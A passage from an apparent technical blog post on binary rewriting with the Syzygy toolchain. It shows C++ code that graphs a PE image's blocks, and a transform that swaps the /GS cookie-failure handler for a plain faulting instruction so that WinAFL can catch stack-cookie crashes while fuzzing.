</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">selected_nodes</span><span class="p">.</span><span class="n">count</span><span class="p">(</span><span class="n">to_block</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">selected_nodes</span><span class="p">.</span><span class="n">emplace</span><span class="p">(</span><span class="n">to_block</span><span class="p">,</span> <span class="n">idx</span><span class="o">++</span><span class="p">);</span>
</span><span class='line'>        <span class="n">selected_nodes_levels</span><span class="p">[</span><span class="n">to_block</span><span class="p">]</span> <span class="o">=</span> <span class="n">level</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// If it&#39;s a</span>
</span><span class='line'>        <span class="n">selected_edges</span><span class="p">.</span><span class="n">emplace_back</span><span class="p">(</span><span class="n">node_to_inspect</span><span class="p">,</span> <span class="n">to_block</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// We need to analyze this block at the next iteration (level + 1).</span>
</span><span class='line'>        <span class="n">nodes_to_inspect</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">to_block</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Bump the level as we finished analyzing the nodes we wanted to inspect.</span>
</span><span class='line'>    <span class="n">level</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;var nodes = new vis.DataSet([&quot;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="k">auto</span><span class="o">&amp;</span> <span class="n">node</span> <span class="o">:</span> <span class="n">selected_nodes</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Block</span><span class="o">*</span> <span class="n">block</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="n">first</span><span class="p">);</span>
</span><span class='line'>    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">compiland_path</span> <span class="o">=</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">compiland_name</span><span class="p">().</span><span class="n">c_str</span><span class="p">();</span>
</span><span class='line'>    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">compiland_name</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="n">compiland_path</span><span class="p">,</span> <span class="sc">&#39;\\&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">description</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">compiland_name</span> <span class="o">!=</span> <span class="n">nullptr</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">compiland_name</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">compiland_name</span> <span class="o">=</span> <span class="s">&quot;Unknown&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">uint32_t</span> <span class="n">level</span> <span class="o">=</span> <span class="n">selected_nodes_levels</span><span class="p">[</span><span class="n">block</span><span class="p">];</span>
</span><span class='line'>    <span class="n">_snprintf_s</span><span class="p">(</span><span class="n">description</span><span class="p">,</span> <span class="n">ARRAYSIZE</span><span class="p">(</span><span class="n">description</span><span class="p">),</span> <span class="n">_TRUNCATE</span><span class="p">,</span>
</span><span class='line'>                <span class="s">&quot;RVA: %p&lt;br&gt;Size: %d&lt;br&gt;Level: %d&lt;br&gt;Compiland: %s&quot;</span><span class="p">,</span>
</span><span class='line'>                <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">block</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">().</span><span class="n">value</span><span class="p">(),</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">(),</span> <span class="n">level</span><span class="p">,</span>
</span><span class='line'>                <span class="n">compiland_name</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;  { id : &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">node</span><span class="p">.</span><span class="n">second</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;, label : </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">&lt;&lt;</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">()</span>
</span><span class='line'>              <span class="o">&lt;&lt;</span> <span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">, &quot;</span>
</span><span class='line'>              <span class="o">&lt;&lt;</span> <span class="s">&quot;title : &#39;&quot;</span> <span class="o">&lt;&lt;</span> <span class="n">description</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;&#39;, group : &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">level</span>
</span><span class='line'>              <span class="o">&lt;&lt;</span> <span class="s">&quot;, value : &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">&quot; },&quot;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;]);&quot;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span>
</span><span class='line'>            <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;var edges = new vis.DataSet([&quot;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="k">auto</span><span class="o">&amp;</span> <span class="n">edge</span> <span class="o">:</span> <span class="n">selected_edges</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;  { from : &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">selected_nodes</span><span class="p">.</span><span class="n">at</span><span class="p">(</span><span class="n">edge</span><span class="p">.</span><span class="n">first</span><span class="p">)</span>
</span><span class='line'>              <span class="o">&lt;&lt;</span> <span class="s">&quot;, to : &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">selected_nodes</span><span class="p">.</span><span class="n">at</span><span class="p">(</span><span class="n">edge</span><span class="p">.</span><span class="n">second</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&quot; },&quot;</span>
</span><span class='line'>              <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;]);&quot;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span><span class='line'>  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The above function basically starts to walk the network from the <code>main</code> function and do a BFS algorithm (that allows us to define <em>levels</em> for each Block). It then outputs two sets of data: the nodes, and the edges.</p>

<p>If you would like to check out the result I have uploaded an interactive network graph here: <a href="http://doar-e.github.io/images/binary_rewriting_with_syzygy/network.afl-fuzz.exe.html">network.afl-fuzz.exe.html</a>. Even though it sounds pretty useless, it looks pretty cool!</p>

<h2>SecurityCookieCheckHookTransform</h2>

<h3>The problem</h3>

<p>The idea for this transform came back when I was playing around with <a href="https://github.com/ivanfratric/winafl">WinAFL</a>; I encountered a case where one of the test-case triggered a <a href="https://msdn.microsoft.com/en-us/library/8dbf701c.aspx">/GS</a> violation in a harness program I was fuzzing. Buffer security checks are a set of compiler and runtime instrumentation aiming at detecting and preventing the exploitation of stack-based buffer overflows. A cookie is placed on the stack by the prologue of the protected function in between the local variables of the stack-frame and the saved stack pointer / saved instruction pointer. The compiler instruments the code so that before the function returns, it invokes a check function (called <code>__security_check_cookie</code>) that ensure the integrity of the cookie.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="c1">; void __fastcall __security_check_cookie(unsigned int cookie)</span>
</span><span class='line'><span class="err">@</span><span class="nf">__security_check_cookie@4</span> <span class="nv">proc</span> <span class="nv">near</span>
</span><span class='line'><span class="nf">cookie</span><span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">4</span>
</span><span class='line'>   <span class="nf">cmp</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nv">___security_cookie</span>
</span><span class='line'>   <span class="nf">repne</span> <span class="nv">jnz</span> <span class="nv">short</span> <span class="nv">failure</span>
</span><span class='line'>   <span class="nf">repne</span> <span class="nv">retn</span>
</span><span class='line'><span class="nl">failure:</span>
</span><span class='line'>   <span class="nf">repne</span> <span class="nv">jmp</span> <span class="nv">___report_gsfailure</span>
</span><span class='line'><span class="err">@</span><span class="nf">__security_check_cookie@4</span> <span class="nv">endp</span>
</span></code></pre></td></tr></table></div></figure>


<p>If the cookie matches the secret, everything is fine, the function returns and life goes on. If it does not, it means something overwrote it and as a result the process needs to be killed. The way the check function achieves this is by raising an exception that the process cannot even catch itself; which makes sense if you think about it as you don&rsquo;t want an attacker to be able to hijack the exception.</p>

<p>On recent version of Windows, this is achieved via a <a href="http://www.alex-ionescu.com/?p=69">fail-fast exception</a> or by invoking <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms681401(v=vs.85).aspx">UnhandledExceptionFilter</a> (after forcing the top level exception filter to 0) and terminating the process (done by <code>__raise_securityfailure</code>).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="c1">; void __cdecl __raise_securityfailure(_EXCEPTION_POINTERS *const exception_pointers)</span>
</span><span class='line'><span class="nf">___raise_securityfailure</span> <span class="nv">proc</span> <span class="nv">near</span>
</span><span class='line'><span class="nf">exception_pointers</span><span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span>  <span class="mi">8</span>
</span><span class='line'>   <span class="nf">push</span>    <span class="nb">ebp</span>
</span><span class='line'>   <span class="nf">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span><span class='line'>   <span class="nf">push</span>    <span class="mi">0</span>
</span><span class='line'>   <span class="nf">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">__imp__SetUnhandledExceptionFilter@4</span>
</span><span class='line'>   <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">exception_pointers</span><span class="p">]</span>
</span><span class='line'>   <span class="nf">push</span>    <span class="nb">eax</span>
</span><span class='line'>   <span class="nf">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">__imp__UnhandledExceptionFilter@4</span>
</span><span class='line'>   <span class="nf">push</span>    <span class="mh">0C0000409h</span>
</span><span class='line'>   <span class="nf">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">__imp__GetCurrentProcess@0</span>
</span><span class='line'>   <span class="nf">push</span>    <span class="nb">eax</span>
</span><span class='line'>   <span class="nf">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">__imp__TerminateProcess@8</span>
</span><span class='line'>   <span class="nf">pop</span>     <span class="nb">ebp</span>
</span><span class='line'>   <span class="nf">retn</span>
</span><span class='line'><span class="nf">___raise_securityfailure</span> <span class="nv">endp</span>
</span></code></pre></td></tr></table></div></figure>


<p>Funny enough &ndash; if this sounds familiar &ndash; turns out I have encountered this very problem a while back and you can read the story here: <a href="http://doar-e.github.io/blog/2013/10/12/having-a-look-at-the-windows-userkernel-exceptions-dispatcher/">Having a Look at the Windows&#8217; User/Kernel Exceptions Dispatcher</a>.</p>

<p>The thing is when you are fuzzing, this is exactly the type of thing you would like to be aware of. WinAFL uses an in-process exception handler to do the crash monitoring part which means that this type of crashes would not go through the crash monitoring. Bummer.</p>

<h3>The solution</h3>

<p>I started evaluating syzygy with this simple task: making the program crash with a <em>regular</em> exception (that can get caught by an in-process exception handler). I figured it would be a walk in the park, as I basically needed to apply very little transformation to the binary to make this work.</p>

<p>First step is to define a transform as in the previous example. This time I subclass <code>NamedBlockGraphTransformImpl</code> which wants me to implement a <code>TransformBlockGraph</code> method that receives: a transform policy (used to make decision before applying transformation), the graph (block_graph) and a data Block that represents the PE header of our image (header_block):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="k">class</span> <span class="nc">SecurityCookieCheckHookTransform</span>
</span><span class='line'>    <span class="o">:</span> <span class="k">public</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">transforms</span><span class="o">::</span><span class="n">NamedBlockGraphTransformImpl</span><span class="o">&lt;</span>
</span><span class='line'>          <span class="n">SecurityCookieCheckHookTransform</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'> <span class="k">public</span><span class="o">:</span>
</span><span class='line'>  <span class="n">SecurityCookieCheckHookTransform</span><span class="p">()</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">kTransformName</span><span class="p">[];</span>
</span><span class='line'>  <span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">kReportGsFailure</span><span class="p">[];</span>
</span><span class='line'>  <span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">kSyzygyReportGsFailure</span><span class="p">[];</span>
</span><span class='line'>  <span class="k">static</span> <span class="k">const</span> <span class="n">uint32_t</span> <span class="n">kInvalidUserAddress</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// BlockGraphTransformInterface implementation.</span>
</span><span class='line'>  <span class="kt">bool</span> <span class="n">TransformBlockGraph</span><span class="p">(</span><span class="k">const</span> <span class="n">TransformPolicyInterface</span><span class="o">*</span> <span class="n">policy</span><span class="p">,</span>
</span><span class='line'>                           <span class="n">BlockGraph</span><span class="o">*</span> <span class="n">block_graph</span><span class="p">,</span>
</span><span class='line'>                           <span class="n">BlockGraph</span><span class="o">::</span><span class="n">Block</span><span class="o">*</span> <span class="n">header_block</span><span class="p">)</span> <span class="n">final</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>As I explained a bit earlier, the BlockGraph is the top level container of Blocks. This is what I walk through in order to find our Block of interest. The Block of interest for us has the name <code>__report_gsfailure</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Block</span><span class="o">*</span> <span class="n">report_gsfailure</span> <span class="o">=</span> <span class="n">nullptr</span><span class="p">;</span>
</span><span class='line'><span class="n">BlockGraph</span><span class="o">::</span><span class="n">BlockMap</span><span class="o">&amp;</span> <span class="n">blocks</span> <span class="o">=</span> <span class="n">block_graph</span><span class="o">-&gt;</span><span class="n">blocks_mutable</span><span class="p">();</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">block</span> <span class="o">:</span> <span class="n">blocks</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">name</span><span class="p">(</span><span class="n">block</span><span class="p">.</span><span class="n">second</span><span class="p">.</span><span class="n">name</span><span class="p">());</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">name</span> <span class="o">==</span> <span class="n">kReportGsFailure</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">report_gsfailure</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">block</span><span class="p">.</span><span class="n">second</span><span class="p">;</span>
</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">report_gsfailure</span> <span class="o">==</span> <span class="n">nullptr</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">LOG</span><span class="p">(</span><span class="n">ERROR</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;Could not find &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">kReportGsFailure</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;.&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The transform tries to be careful by checking that the Block only has a single referrer: which should be the <code>__security_cookie_check</code> Block. If not, I gracefully exit and don&rsquo;t apply the transformation as I am not sure with what I am dealing with.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">report_gsfailure</span><span class="o">-&gt;</span><span class="n">referrers</span><span class="p">().</span><span class="n">size</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="c1">// We bail out if we don&#39;t have a single referrer as the only</span>
</span><span class='line'>  <span class="c1">// expected referrer is supposed to be __security_cookie_check.</span>
</span><span class='line'>  <span class="c1">// If there is more than one, we would rather bail out than take</span>
</span><span class='line'>  <span class="c1">// a chance at modifying the behavior of the PE image.</span>
</span><span class='line'>  <span class="n">LOG</span><span class="p">(</span><span class="n">ERROR</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;Only a single referrer to &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">kReportGsFailure</span>
</span><span class='line'>             <span class="o">&lt;&lt;</span> <span class="s">&quot; is expected.&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>At this point, I create a new Block that has only a single instruction designed to trigger a fault every time; to do so I can even use the basic Intel assembler integrated in syzygy. After this, I place this new Block inside the <code>.text</code> section the image (tracked by the BlockGraph as mentioned earlier).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Section</span><span class="o">*</span> <span class="n">section_text</span> <span class="o">=</span> <span class="n">block_graph</span><span class="o">-&gt;</span><span class="n">FindOrAddSection</span><span class="p">(</span>
</span><span class='line'>    <span class="n">pe</span><span class="o">::</span><span class="n">kCodeSectionName</span><span class="p">,</span> <span class="n">pe</span><span class="o">::</span><span class="n">kCodeCharacteristics</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// All of the below is needed to build the instrumentation via the assembler.</span>
</span><span class='line'><span class="n">BasicBlockSubGraph</span> <span class="n">bbsg</span><span class="p">;</span>
</span><span class='line'><span class="n">BasicBlockSubGraph</span><span class="o">::</span><span class="n">BlockDescription</span><span class="o">*</span> <span class="n">block_desc</span> <span class="o">=</span> <span class="n">bbsg</span><span class="p">.</span><span class="n">AddBlockDescription</span><span class="p">(</span>
</span><span class='line'>    <span class="n">kSyzygyReportGsFailure</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="n">BlockGraph</span><span class="o">::</span><span class="n">CODE_BLOCK</span><span class="p">,</span>
</span><span class='line'>    <span class="n">section_text</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">(),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">BasicCodeBlock</span><span class="o">*</span> <span class="n">bb</span> <span class="o">=</span> <span class="n">bbsg</span><span class="p">.</span><span class="n">AddBasicCodeBlock</span><span class="p">(</span><span class="n">kSyzygyReportGsFailure</span><span class="p">);</span>
</span><span class='line'><span class="n">block_desc</span><span class="o">-&gt;</span><span class="n">basic_block_order</span><span class="p">.</span><span class="n">pushf_back</span><span class="p">(</span><span class="n">bb</span><span class="p">);</span>
</span><span class='line'><span class="n">BasicBlockAssembler</span> <span class="n">assm</span><span class="p">(</span><span class="n">bb</span><span class="o">-&gt;</span><span class="n">instructions</span><span class="p">().</span><span class="n">begin</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">bb</span><span class="o">-&gt;</span><span class="n">instructions</span><span class="p">());</span>
</span><span class='line'><span class="n">assm</span><span class="p">.</span><span class="n">mov</span><span class="p">(</span><span class="n">Operand</span><span class="p">(</span><span class="n">Displacement</span><span class="p">(</span><span class="n">kInvalidUserAddress</span><span class="p">)),</span> <span class="n">assm</span><span class="o">::</span><span class="n">eax</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Condense into a block.</span>
</span><span class='line'><span class="n">BlockBuilder</span> <span class="n">block_builder</span><span class="p">(</span><span class="n">block_graph</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">block_builder</span><span class="p">.</span><span class="n">Merge</span><span class="p">(</span><span class="o">&amp;</span><span class="n">bbsg</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">LOG</span><span class="p">(</span><span class="n">ERROR</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;Failed to build &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">kSyzygyReportGsFailure</span> <span class="o">&lt;&lt;</span> <span class="s">&quot; block.&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">DCHECK_EQ</span><span class="p">(</span><span class="mi">1u</span><span class="p">,</span> <span class="n">block_builder</span><span class="p">.</span><span class="n">new_blocks</span><span class="p">().</span><span class="n">size</span><span class="p">());</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally, I update all the referrers to point to our new Block, and remove the <code>__report_gsfailure</code> Block as it is effectively now dead-code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="c1">// Transfer the referrers to the new block, and delete the old one.</span>
</span><span class='line'><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Block</span><span class="o">*</span> <span class="n">syzygy_report_gsfailure</span> <span class="o">=</span>
</span><span class='line'>    <span class="n">block_builder</span><span class="p">.</span><span class="n">new_blocks</span><span class="p">().</span><span class="n">front</span><span class="p">();</span>
</span><span class='line'><span class="n">report_gsfailure</span><span class="o">-&gt;</span><span class="n">TransferReferrers</span><span class="p">(</span>
</span><span class='line'>    <span class="mi">0</span><span class="p">,</span> <span class="n">syzygy_report_gsfailure</span><span class="p">,</span>
</span><span class='line'>    <span class="n">BlockGraph</span><span class="o">::</span><span class="n">Block</span><span class="o">::</span><span class="n">kTransferInternalReferences</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">report_gsfailure</span><span class="o">-&gt;</span><span class="n">RemoveAllReferences</span><span class="p">();</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">block_graph</span><span class="o">-&gt;</span><span class="n">RemoveBlock</span><span class="p">(</span><span class="n">report_gsfailure</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">LOG</span><span class="p">(</span><span class="n">ERROR</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;Removing &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">kReportGsFailure</span> <span class="o">&lt;&lt;</span> <span class="s">&quot; failed.&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here is what it looks like after our transformation:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="c1">; void __fastcall __security_check_cookie(unsigned int cookie)</span>
</span><span class='line'><span class="err">@</span><span class="nf">__security_check_cookie@4</span> <span class="nv">proc</span> <span class="nv">near</span>
</span><span class='line'><span class="nf">cookie</span> <span class="err">=</span> <span class="nb">ecx</span>
</span><span class='line'>                <span class="nf">cmp</span>     <span class="nv">cookie</span><span class="p">,</span> <span class="nv">___security_cookie</span>
</span><span class='line'>                <span class="nf">repne</span> <span class="nv">jnz</span> <span class="nv">short</span> <span class="nv">failure</span>
</span><span class='line'>                <span class="nf">repne</span> <span class="nv">retn</span>
</span><span class='line'><span class="nl">failure:</span>
</span><span class='line'>                <span class="nf">repne</span> <span class="nv">jmp</span> <span class="nv">loc_426EE6</span> <span class="o">&lt;-</span> <span class="nv">our</span> <span class="nv">new</span> <span class="nv">__report_gsfailure</span> <span class="nb">bl</span><span class="nv">ock</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_426EE6:</span>
